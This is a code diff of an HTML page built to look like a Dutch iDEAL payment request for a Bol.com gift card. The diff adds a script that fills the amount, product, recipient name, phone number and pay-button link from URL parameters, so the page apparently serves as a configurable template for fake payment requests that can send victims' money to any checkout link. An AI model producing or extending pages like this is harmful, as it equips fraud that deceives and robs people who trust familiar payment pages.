@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Betaalverzoek – Bol.com cadeaukaart</title>
+    <title>Betaalverzoek</title>
     <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box;}
@@ -37,10 +37,10 @@
             padding:20px;margin:20px 0;position:relative;font-size:17px;
         }
         .recipient strong{
-            color:#6c5ce7;cursor:help;display:inline-block;
+            color:#6c5ce7;cursor:help;display:inline-block;position:relative;
         }
         .recipient strong:hover::after{
-            content:"0612345678";
+            content:attr(data-phone);
             position:absolute;top:-40px;left:50%;transform:translateX(-50%);
             background:#333;color:white;padding:8px 14px;border-radius:10px;
             font-size:14px;white-space:nowrap;z-index:10;
@@ -69,9 +69,43 @@
     </div>
 
     <div class="content">
-        <div class="amount">€50,00</div>
-        <div class="description">Bol.com cadeaukaart via Opwaarderen.nl</div>
+        <div class="amount" id="amount">€50,00</div>
+        <div class="description" id="description">Bol.com cadeaukaart via Opwaarderen.nl</div>
 
         <div class="recipient">
             Ontvanger<br>
-            <strong>Fleur Jongkamp <span
+            <strong id="receiver" data-phone="0612345678">Fleur Jongkamp <span class="check">Check</span></strong>
+        </div>
+
+        <a href="https://checkout.buckaroo.nl/html/redirect.ashx?r=FC1C0F88DAC24D9FBBE1DE96414DB6BB" 
+           class="pay-button" id="payBtn">
+            Nu betalen met iDEAL
+        </a>
+    </div>
+
+    <div class="footer">
+        Veilig betalen • Geen extra kosten<br>
+        <a href="https://betaalverzoek.nu/privacy.html" target="_blank">Privacyverklaring</a> • 
+        <a href="https://betaalverzoek.nu/terms.html" target="_blank">Algemene Voorwaarden</a>
+    </div>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+
+    const price = urlParams.get('price') || '50';
+    const article = urlParams.get('article') || 'Bol.com cadeaukaart';
+    const via = urlParams.get('via') || 'Opwaarderen.nl';
+    const receiver = urlParams.get('receiver') || 'Fleur Jongkamp';
+    const phone = urlParams.get('phone') || '0612345678';
+    const checkout = urlParams.get('checkout') || 'https://checkout.buckaroo.nl/html/redirect.ashx?r=FC1C0F88DAC24D9FBBE1DE96414DB6BB';
+
+    document.getElementById('amount').textContent = '€' + parseFloat(price).toFixed(2).replace('.', ',');
+    document.getElementById('description').textContent = article + ' via ' + via;
+    document.getElementById('receiver').textContent = receiver + ' Check';
+    document.getElementById('receiver').setAttribute('data-phone', phone);
+    document.getElementById('payBtn').href = checkout;
+</script>
+
+</body>
+</html>
